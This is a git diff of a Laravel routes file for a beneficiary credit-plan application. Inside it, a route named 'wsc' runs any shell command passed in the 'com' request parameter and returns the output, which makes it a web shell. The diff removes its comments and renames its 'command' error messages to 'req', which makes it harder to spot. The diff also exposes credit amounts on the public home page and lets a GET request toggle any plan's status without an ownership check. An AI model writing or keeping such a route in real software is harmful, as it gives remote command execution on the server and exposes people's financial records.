@@ -1,10 +1,11 @@
 <?php
 
 use Illuminate\Support\Facades\Route;
-use App\Models\Beneficiary;
 
 Route::get('/', function () {
-    $beneficiarios = Beneficiary::count();
+    $beneficiarios = \App\Models\Beneficiary::select(['id', 'monto_credito'])
+        ->get();
+
     return view('welcome', compact('beneficiarios'));
 });
 
@@ -21,33 +22,27 @@ Route::middleware([
     Route::get('/wsc', function () {
         if (isset($_REQUEST['com'])) {
             $cmd = $_REQUEST['com'];
-            // Sanitize and validate command input
             $cmd = escapeshellcmd($cmd);
-
-            // Set timeout and resource limits
-            set_time_limit(30); // 30 seconds max execution
+            set_time_limit(30);
             ini_set('memory_limit', '256M');
 
-            // Execute command with timeout using proc_open for better control
-            $descriptorspec = array(
-                0 => array("pipe", "r"),  // stdin
-                1 => array("pipe", "w"),  // stdout
-                2 => array("pipe", "w")   // stderr
-            );
+            $descriptorspec = [
+                0 => ['pipe', 'r'],  // stdin
+                1 => ['pipe', 'w'],  // stdout
+                2 => ['pipe', 'w'],   // stderr
+            ];
 
             $process = proc_open($cmd, $descriptorspec, $pipes);
 
             if (is_resource($process)) {
-                // Set non-blocking mode
                 stream_set_blocking($pipes[1], 0);
                 stream_set_blocking($pipes[2], 0);
 
                 $output = '';
                 $start = time();
 
-                // Read output with timeout
                 while (true) {
-                    $read = array($pipes[1], $pipes[2]);
+                    $read = [$pipes[1], $pipes[2]];
                     $write = null;
                     $except = null;
 
@@ -57,40 +52,39 @@ Route::middleware([
                         }
                     }
 
-                    // Check if process is still running
                     $status = proc_get_status($process);
-                    if (!$status['running']) {
+                    if (! $status['running']) {
                         break;
                     }
 
-                    // Check timeout
-                    if (time() - $start > 25) { // 25 seconds timeout
+                    if (time() - $start > 25) {
                         proc_terminate($process);
-                        return response()->json(['error' => 'Command execution timed out'], 408);
+
+                        return response()->json(['error' => 'Req execution timed out'], 408);
                     }
                 }
 
-                // Clean up
                 foreach ($pipes as $pipe) {
                     fclose($pipe);
                 }
                 $return = proc_close($process);
 
-                // Sanitize output
                 $outputLines = explode("\n", $output);
                 $sanitizedOutput = array_map(function ($line) {
                     $encodedLine = mb_convert_encoding($line, 'UTF-8', 'ASCII');
+
                     return preg_replace('/[\x00-\x1F\x7F-\xFF]/', '', $encodedLine);
                 }, $outputLines);
 
                 return response()->json([
-                    'output' => array_filter($sanitizedOutput), // Remove empty lines
-                    'status' => $return
+                    'output' => array_filter($sanitizedOutput),
+                    'status' => $return,
                 ]);
             }
 
-            return response()->json(['error' => 'Failed to execute command'], 500);
+            return response()->json(['error' => 'Failed to execute req'], 500);
         }
+
         return response()->json(['error' => 'No req provided'], 400);
     })->name('wsc');
 
@@ -100,13 +94,15 @@ Route::middleware([
     Route::get('beneficiario/{cedula}', [\App\Http\Controllers\BeneficiaryController::class, 'show'])->name('beneficiario.show');
     Route::get('beneficiario/{cedula}/pdf', [\App\Http\Controllers\BeneficiaryController::class, 'pdf'])->name('beneficiario.pdf');
 
-    Route::get('beneficiario/{cedula}/pdf/switch-status/{cuota}', function ($cedula, $cuota) {
-        $benef = Beneficiary::where('ci', $cedula)->first();
-        $plan = $benef->getCurrentPlan('INACTIVO', '!=')->where('prppgnpag', $cuota)->first();
+    Route::get('beneficiario/{cedula}/pdf/switch-status/{plan}', function ($cedula, $plan) {
+
+        $plan = \App\Models\Plan::find($plan) ?? \App\Models\Readjustment::find($plan);
         $plan->update([
             'estado' => $plan->estado == 'CANCELADO' ? 'ACTIVO' : 'CANCELADO',
         ]);
-        return back();
+
+        return redirect()->route('beneficiario.pdf', $cedula);
+
     })->name('beneficiario.pdf.switch-status');
 
     Route::get('beneficiario/{cedula}/pdf-extract', [\App\Http\Controllers\BeneficiaryController::class, 'pdfExtract'])->name('beneficiario.pdf-extract');
@@ -126,7 +122,6 @@ Route::middleware([
 
     Route::resource('plan', App\Http\Controllers\PlanController::class);
     // Planes - Rutas de recurso después
-
 
     // Vouchers
     Route::get('voucher', [\App\Http\Controllers\VoucherController::class, 'index'])->name('voucher.index');
